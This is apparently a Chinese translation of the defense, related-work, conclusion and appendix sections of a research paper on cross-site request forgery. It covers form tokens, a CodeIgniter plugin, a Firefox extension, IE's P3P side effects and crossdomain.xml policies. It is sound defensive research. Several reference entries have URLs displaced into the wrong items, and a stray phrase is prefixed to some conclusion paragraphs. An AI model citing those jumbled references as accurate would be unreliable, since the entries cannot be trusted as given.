<font size=3>&emsp;&emsp;之前已经提出了在表单中使用伪随机值，但是许多之前的提议的实现没有上述特征。 例如，Johns和Winter [24]以及Schreiber [27]需要服务器状态，而Shiflett [28]打破分页浏览。 据我们所知，以前提出的解决方案并没有强调使用典型浏览行为的重要性。</font>
<br>
<font size=3>&emsp;&emsp;任何拦截POST请求和“包装”命令以生成<form>标签的框架都可以透明地将上述CSRF保护构建到框架中。 例如，如果框架要求开发人员调用函数form.open（...）; 要生成<form ...>标记，可以修改框架以在每次创建表单时自动生成伪随机值：</font>

```
<form ...>
<input type="hidden" name="csrf value" value="8dcb5e56904d9b7d4bbf333afdd154ca">
```
<br>
<font size=3>&emsp;&emsp;此外，框架可以处理设置相关的cookie值并将提交的值与cookie值进行比较。如果框架添加了这种CSRF保护，则框架的所有用户都将受到CSRF攻击的保护。由于这种CSRF保护是轻量级的，并且与框架或开发人员可能提供的任何身份验证方法无关，因此我们强烈建议拦截POST请求并提供生成<form>标记的函数的框架实现此类CSRF保护并默认打开它。该框架应该为开发人员提供禁用此保护的功能，例如，如果他们自己实现了CSRF保护，或者他们不需要cookie。</font>
<br>
<font size=3>&emsp;&emsp;我们为Code Igniter框架提供了这样一个插件。该插件不需要开发人员修改任何现有表单，并将拦截（并验证伪随机值）POST请求以及创建<form>标记的函数调用。该插件还提供了一个允许将CSRF令牌添加到AJAX请求的功能，尽管这个功能的实现需要开发人员的干预（Code Igniter没有执行AJAX请求的标准方法）。该插件可以从我们的网站下载6。</font>
<br>
<br>
<font size=4><b>4.2&emsp;客户端保护</b></font>
<br>
<font size=3>&emsp;&emsp;由于Web浏览器发送允许攻击者成功执行CSRF攻击的请求，因此可以创建客户端工具来保护用户免受这些攻击。一个现有工具RequestRodeo[24]通过充当客户端和服务器之间的代理来工作。如果RequestRodeo看到它认为无效的请求，它会从请求中删除身份验证信息。虽然这在许多情况下都有效，但它有一些局限性。特别是，当使用客户端SSL身份验证时，或者使用JavaScript生成页面的一部分时，它将无法工作（因为RequestRodeo在数据通过代理时以及在被浏览器显示之前分析数据）。</font>
<br>
<font size=3>&emsp;&emsp;我们开发了一个可以保护用户免受某些类型的CSRF攻击的浏览器插件，我们将我们的工具开发为为Firefox Web浏览器的扩展程序。用户需要下载并安装此扩展程序才能有效抵御CSRF攻击。</font>
<br>
<font size=3>&emsp;&emsp;我们的扩展工具通过拦截每个HTTP请求并决定是否允许它来工作。此决定使用以下规则进行。首先，允许任何不是POST请求的请求。其次，如果请求站点和目标站点属于同源策略（参见附录B），则允许该请求。第三，如果允许请求站点使用Adobe的跨域策略向目标站点发出请求（请参阅附录B），则允许该请求。如果我们的扩展程序拒绝请求，则扩展程序会使用熟悉的界面（与Firefox的弹出窗口阻止程序使用的界面相同）提醒用户该请求已被阻止，并为用户提供将站点添加到白名单的选项。</font>
<br>
<font size=3>&emsp;&emsp;我们的扩展只拦截POST请求。这意味着我们的扩展不会保护用户免受使用GET请求的CSRF攻击。防止此类攻击的唯一方法是既不允许跨域GET请求，也不允许用户一次只登录到一个站点，用户可能会发现过于繁琐的限制。
<font size=3>&emsp;&emsp;这个Firefox扩展可以在我们的网站上下载7。</font>
<br>
<br>
<br>
<br>
<font size=5><b>5&emsp;相关工作</b></font>
<br>
<br>
<font size=3>&emsp;&emsp;已获得的CSRF攻击的曝光很大程度上是由于OmniTI的Chris Shiflett [28]和WhiteHat Security的Jeremiah Grossman [23]的工作。 Burns [19]和Schreiber [27]提供了对CSRF攻击全面综合的介绍，但没有描述工作漏洞。 Johns和Winter[24]描述了RequestRodeo，这是一种使用HTTP代理防止CSRF攻击的客户端保护。这种方法有一些局限性，它们描述了一个类似于我们的浏览器插件，可能在未来实现。他们在[25]中通过实施受限制的阻止对本地资源CSRF攻击的本地网络扩展了这项工作。</font>
<br>
<font size=3>&emsp;&emsp;存在与我们的建议类似的服务器端保护，但缺乏标准要求引起了不必要的问题。如前所述，Johns和Winter [24]以及Schreiber [27]需要服务器状态，而Shiflett [28]打破了分页式浏览。Jovanovic奇等人[26]通过在Web服务器和Web应用程序之间添加代理，创建了一种通过CSRF保护来改进遗留应用程序的方法。这些保护要求缓冲所有数据并修改应用程序中的链接。它们还需要重写某些应用程序调用。当本机应用程序无法重写时，此解决方案很有效，但不如直接向应用程序添加CSRF保护有效。该解决方案面向希望保护其服务器上的应用程序免受CSRF攻击的管理员，而我们的解决方案针对希望直接在其程序中添加CSRF保护的Web应用程序和框架开发人员。</font>
<br>
<br>
<br>
<br>
<font size=5><b>6&emsp;未来的工作</b></font>
<br>
<br>
<font size=3>&emsp;&emsp;鉴于CSRF漏洞的普遍存在，扫描这些问题的自动方法将非常有用。 Bortz和Boneh[18]描述了跨站点攻击，并建议将它们与CSRF攻击相结合，以进一步破坏用户隐私。</font>
<br>
<font size=3>&emsp;&emsp;我们的客户端浏览器插件是Firefox扩展程序，仅适用于Firefox。 可以为其他浏览器编写类似的插件。 同样，我们的CodeIgniter扩展使用的服务器端方法可以在其他框架中轻松实现。</font>
<br>
<font size=3>&emsp;&emsp;我们的客户端浏览器插件似乎是Adobe自己的Flash程序之外的第一个Adobe跨域策略实现。 可以做更多的工作，看看在其他情况下仔细采用这一政策是否会增加用户保护和网站灵活性。</font>
<br>
<br>
<br>
<br>
<font size=5><b>7&emsp;结论</b></font>
<br>
<br>
<font size=3>&emsp;&emsp;CSRF攻击的诊断、利用和修复相对简单。网站可以在几秒钟内被分析分析;可以在几分钟内被攻击。对这些攻击普遍存在的最合理的解释是Web开发人员没有意识到这个问题，或者（错误地）认为针对更知名的跨站点脚本攻击的防御也可以抵御CSRF攻击。我们希望我们提出的攻击显示出CSRF攻击的危险，并帮助Web开发人员给予他们应有的关注。一旦Web开发人员意识到CSRF攻击，他们就可以使用像我们创建的工具来保护自己。</font>
<br>
<font size=3>&emsp;&emsp;CSRF攻击的诊断我们建议框架的创建者将CSRF保护添加到他们的框架中，从而保护构建在这种框架之上的任何站点。在框架级别添加CSRF保护可以使开发人员免于重复编写代码，甚至避免详细了解CSRF攻击（尽管建议了解这些攻击）。在每个站点都受到CSRF攻击保护之前，用户可以使用我们的Firefox浏览器插件来保护自己。也可以为其他浏览器编写类似的插件。</font>
<br>
<font size=3>&emsp;&emsp;CSRF攻击的诊断CSRF和类似漏洞的根本原因可能在于当今Web协议的复杂性，以及Web从数据呈现设施到交互式服务平台的逐步演变。随着更多功能被添加到浏览器客户端，并且随着更多站点涉及复杂的编程和客户端-服务器交互式服务，除非采用防御措施，否则CSRF和相关攻击将变得更加普遍。随着Web技术的复杂性不断增加，我们可以预期会出现更多新类型的攻击。</font>
<br>
<br>
<br>
<br>
<font size=5><b>参考</b></font>
<br>
<br>
<font size=3>
<br>[1] About Metafilter. http://www.metafilter. com/about.mefi.

<br>[2] Allowing cross-domain data loading.
http://livedocs.adobe.com/flash/ 9.0/main/wwhelp/wwhimpl/common/ html/wwhelp.htm?context=LiveDocs_ Parts&file=00001085.html.

<br>[3] Catalyst. http://www. catalystframework.org/.
2007/NXTcommEllacoyaMediaAlert.pdf, Jun 2006.

<br>[4] Code Igniter. com/.

<br>[5] django. com/.
http://www.codeigniter.
http://www.djangoproject.

<br>[6] Metafilter: Lost Password? http://www. metafilter.com/login/lostpassword. mefi.

<br>[7] Privacy in Internet Explorer 6.
//msdn2.microsoft.com/en-us/ library/ms537343.aspx.
http:

<br>[8] Ruby on Rails. http://www.rubyonrails. org.

<br>[9] Struts. http://struts.apache.org/.

<br>[10] The New York Times: Media Kit 2007.
http://www.nytimes.whsites.net/ mediakit/pages/d_aud_target.html.

<br>[11] The Same-Origin Policy. http://livedocs. adobe.com/flash/9.0/main/wwhelp/ wwhimpl/common/html/wwhelp.htm.

<br>[12] Web Security Threat Classification. http:// www.webappsec.org/projects/threat/.

<br>[13] YouTube Fact Sheet. http://www.youtube. com/t/fact_sheet.

<br>[14] Ellacoya Data Shows Web Traffic Over- takes Peer-to-Peer (P2P) as Largest Per- centage of Bandwidth on the Network. http://www.ellacoya.com/news/pdf/

<br>[15] ING Press Release. http://www.rsa.com/ press_release.aspx?id=7220, Aug 2006.

<br>[16] Alexa Top Sites. http://www.alexa.com/ site/sales, Sep 2007.

<br>[17] A. Barth, C. Jackson, and J. C. Mitchell. Robust Defenses for Cross-Site Request Forgery. In CCS, 2008.

<br>[18] A. Bortz and D. Boneh. Exposing private infor- mation by timing web applications. In WWW ’07: Proceedings of the 16th international conference on World Wide Web, pages 621–628, New York, NY, USA, 2007. ACM Press.

<br>[19] J. Burns. Cross Site Reference Forgery: An in- troduction to a common web application weak- ness. http://www.isecpartners.com/ documents/XSRF_Paper.pdf, 2005.

<br>[20] D. Endler. The Evolution of Cross Site Scripting Attacks. http://cgisecurity.com/lib/ XSS.pdf, May 2002.

<br>[21] R. Fielding, J. Gettys, J. Mogul, H. Frystyk, L. Mas- inter, P. Leach, and T. Berners-Lee. Hypertext Trans- fer Protocol – HTTP/1.1, 1999.

<br>[22] J. Franks, P. Hallam-Baker, J. Hostetler, S. Lawrence, P. Leach, A. Luotonen, and L. Stewart. HTTP Authentication: Basic and Digest Access Authentication, 1999.

<br>[23] J. Grossman. CSRF, the sleeping giant. http: //jeremiahgrossman.blogspot.com/ 2006/09/csrf-sleeping-giant.html, Sep 2006.

<br>[24] M. Johns and J. Winter. RequestRodeo: Client Side Protection against Session Riding. In F. Piessens, editor, Proceedings of the OWASP Europe 2006 Conference, refereed papers track, Report CW448, pages 5 – 17. Departement Computerwetenschap- pen, Katholieke Universiteit Leuven, May 2006.

<br>[25] M. Johns and J. Winter. Protecting the Intranet Against “JavaScript Malware” and Related Attacks. In DIMVA, 2007.

<br>[26] N. Jovanovic, E. Kirda, and C. Kruegel. Preventing Cross Site Request Forgery Attacks. Securecomm and Workshops, 2006, pages 1–10, Aug. 28 2006- Sept. 1 2006.

<br>[27] T. Schreiber. Session Riding: A Widespread Vulnerability in Today’s Web Applications. http://www.securenet.de/papers/ Session_Riding.pdf, 2004.

<br>[28] C. Shiflett. Security Corner: Cross-Site Re- quest Forgeries. http://shiflett. org/articles/cross-site-request- forgeries, Dec 2004.

<br>[29]C. Shiflett. The crossdomain.xml Witch Hunt.http://shiflett.org/blog/2006/oct/ the-crossdomain.xml-witch-hunt, Oct 2006.

<br>[30]C.Shiflett.TheDangersofCross-DomainAjaxwith Flash. http://shiflett.org/blog/2006/ sep/the-dangers-of-cross-domain- ajax-with-flash, Sep 2006.</font>

<br>
<br>
<br>
<br>
<font size=5><b>A&emsp;Internet Explorer和CSRF</b></font>
<br>
<br>
<font size=3>&emsp;&emsp;Cookie可用于跟踪多个网站的用户。例如，假设广告商在其服务器上托管被大量发布商网站包含的图片（广告）。广告商可以在显示图片时设置Cookie，这样广告商可以在访问不同的发布商网站时识别一个特定用户。也就是说，当用户访问发布者网站并加载广告商的图像时，他的cookie将被发送回广告商并被唯一标识。广告商可以使用这些cookie来编辑有关用户上网习惯的数据。</font>
<br>
<font size=3>&emsp;&emsp;关注cookie对用户隐私的这种不利影响导致创建了隐私首选项平台（P3P）。P3P“提供了一个通用的语法和传输机制，使Web站点能与InternetExplorer6（或任何其它用户代理）互通他们的隐私偏好” [7]。从Internet Explorer6开始
，为了接收第三方cookie，Microsoft开始要求所有站点都包含P3P策略。</font>
<br>
<font size=3>&emsp;&emsp;据微软称:</font>

```
高级cookie过滤的工作通过评估网站的隐私惯例，并根据网站的简洁的政策和用户自己的偏好决定哪些cookie可以接受来实现。在默认设置中，用于收集个人身份信息并且不允许用户选择使用的cookie被视为“不满意”。默认情况下，当浏览会话结束时，在不满意的cookie会被在第一方上下文中删除，并在第三方上下文中被拒绝[7]。
```
<br>
<font size=3>&emsp;&emsp;（请注意，P3P政策未经过验证。如果某个网站声称拥有可接受的政策，则InternetExplorer允许使用第三方Cookie。）</font>
<br>
<font size=3>&emsp;&emsp;假设用户浏览包含位于第三方网站上的图像的页面。在P3P的上下文中，第三方站点具有潜在危险，而用户所在的页面被认为是安全的。对于CSRF漏洞，情况正好相反，用户所在的页面存在潜在危险，而第三方网站被认为是安全的（并且是潜在的攻击目标）。当Internet Explorer认为第三方站点存在危险时，会阻止将cookes发送到该站点。当使用“会话cookie”时，这有效地防止了CSRF攻击，因为Internet Explorer正在从跨站点请求中删除身份验证信息。</font>
<br>
<font size=3>&emsp;&emsp;Internet Explorer的P3P策略对CSRF漏洞产生了有趣的影响。具有有效P3P策略的站点不受CSRF攻击保护（Internet Explorer认为这些站点安全并允许cookie），而没有P3P策略的站点却能抵御（Internet Explorer认为这些站点不安全并阻止cookie）CSRF攻击。请注意，这仅适用于影响使用Cookie进行身份验证的网站的CSRF漏洞。使用其他类型身份验证的站点可能仍然容易受到CSRF攻击。</font>
<br>
<font size=3>&emsp;&emsp;总之，因为Internet Explorer 使用P3P策略，当“会话cookie”认证被使用并且目标网站未执行P3P策略 IE用户也能抵御CSRF攻击。这种“保护”是P3P策略的意外后果，不应仅用于防止CSRF攻击。站点应该实现我们的服务器端建议，如4.1节所述。</font>
<br>
<br>
<br>
<br>
<font size=5><b>B&emsp;同源政策</b></font>
<br>
<br>
<font size=3>&emsp;&emsp;Web浏览器的艰巨任务是允许用户维护与多个网站的安全私密连接的同时，还允许访问包含不受信任代码的不受信任的站点。此外，站点还可以从不同的域加载资源。例如，站点a.com可以分别使用<img>或<script>标记从b.com加载图像或JavaScript。但是，如果用户登录到受信任的站点，则不受信任的第三方应该无法读取受信任站点的内容。允许不受信任的站点显示来自外部站点的数据同时仍保持此数据的隐私的愿望致使同源策略[11]的产生。当从不同来源访问数据时，此策略定义“origin”的含义和站点的功能。如果两个页面的协议，端口（如果给定）和主机相同，则策略认为“两个页面具有相同的原点”[11]。根据同源策略，站点无法从不同源的站点读取或修改资源。但是，它可以发送来自不同来源的资源请求。因此，虽然evil.com可以使用<img>标签在其站点中包含图像http://trusted.com/image.gif，但它无法读取此图像的像素数据。同样，虽然evil.com可以使用<iframe>标记在其站点中包含http://trusted.com/private.htm，但它无法访问或修改浏览器显示的页面内容。</font>
<br>
<font size=3>&emsp;&emsp;同源策略仅阻止第三方站点从其他站点读取数据，但不会阻止这些第三方站点发送请求。由于CSRF攻击是由发送的请求引起的（导致在服务器端执行某些操作），因此同源策略不会阻止CSRF攻击，相反，它仅保护第三方站点上数据的隐私。</font>
<br>
<font size=3>&emsp;&emsp;网站有时会发现在不同的域之间进行通信是有用的或必要的。 Adobe提出了一种称为跨域策略的机制[2]，允许其Flash插件在某些情况下与不同的域进行通信（发送和接收数据）。此机制目前仅供Flash使用。具体而言，站点可以指定哪些第三方站点可以访问它。只有该受信任站点在其跨域策略文件中列出第三方站点，第三方站点才能与该受信任站点联系。以下示例跨域策略文件允许访问源自www.friendlysite.com，* .trusted.com和IP地址64.233.167.99的请求。这些文件名为crossdomain.xml，位于域的根目录下。</font>

```
<?xml version="1.0"?>
<cross-domain-policy>
<allow-access-from
domain="www.friendlysite.com" />
<allow-access-from domain="*.trusted.com" />
<allow-access-from domain="64.233.167.99" />
</cross-domain-policy>
```

<br>
<font size=3>&emsp;&emsp;假设上述文件位于http://trusted.com/crossdomain.xml。
如果evil.com使用Flash向http://trusted.com/private.htm发出请求，Flash将首先加载http://trusted.com/ crossdomain.xml以验证evil.com是否被列为受信任者域。因为它不在列表中，所以将阻止请求。另一方面，Flash会允许来自www.friendlysite.com的相同请求，因为它存在于允许的域列表中。</font>

<br>
<font size=3>&emsp;&emsp;如果使用得当，Adobe的跨域策略比起同源策略（除非找到匹配的crossdomain.xml，否则甚至无法启动请求）可以提供更多针对CSRF攻击的保护和更大的灵活性（如果目标站点信任发起站点，则允许跨域请求）。但是，跨域策略经常被不正确地使用，其中目标站点设置为“全部接受”条款。这使得任何网站都可以访问第三方，无论是恶性还是良性。 这种对crossdomain.xml文件的不正确和极其危险的使用甚至可以通过Adobe affiliated8站点，crossdomain.xml.org来实现。 此站点提供了此“接受所有”跨域策略文件的示例，绝对没有解释使用此策略文件所涉及的危险。 有关使用此类跨域策略文件的危险的更多信息，请参阅Chris Shiflett（[30]和[29]）。</font>
<br>
<font size=3>&emsp;&emsp;我们分析了500个顶级网站[16]，发现有143个使用crossdomain.xml策略文件。在这143个站点中，47个站点接受来自第三方站点的所有连接，可能导致CSRF漏洞。</font>
<br>
<font size=3>&emsp;&emsp;当小心使用时，Adobe的跨域策略可以是有效且安全的。 但是，必须注意解释“全部接受”解决方案的危险性。</font>


<br>
<br>
<br>
<br>
<br>
<br>


```
1跨站点请求伪造攻击也称为跨站点参数伪造，XSRF，会话控制和混乱的副攻击。 我们使用术语CSRF，因为CSRF似乎是此类攻击最常用的术语。

2A搜索ACM数字图书馆的“跨站点脚本”（与CSRF不同）显示了72篇论文，而搜索“xsrf OR csrf”只显示了4篇论文。 在Safari Books Online（4752本关于技术的书籍的集合）中搜索“xss”显示该术语出现在96本书中，而“csrf OR xsrf”仅出现在13本书中。

3 URL数据被编码，将@转换为％40等

4ING直接允许用户以任何初始金额创建支票帐户。

5我们假设对手无法修改用户的cookie

6我们Code Igniter 插件：http：//www.cs.princeton.edu/ wzeller / csrf / ci

7我们的CSRF Firefox插件：http：//www.cs.princeton。 edu / wzeller / csrf / protector /

8域名crossdomainxml.org已注册
PowerSDK软件公司的Theodore E Patrick，他在他的LinkedIn个人资料中声称自己是“Adobe Systems的Flex技术布道师”（http://www.linkedin.com/in/tedpatrick）
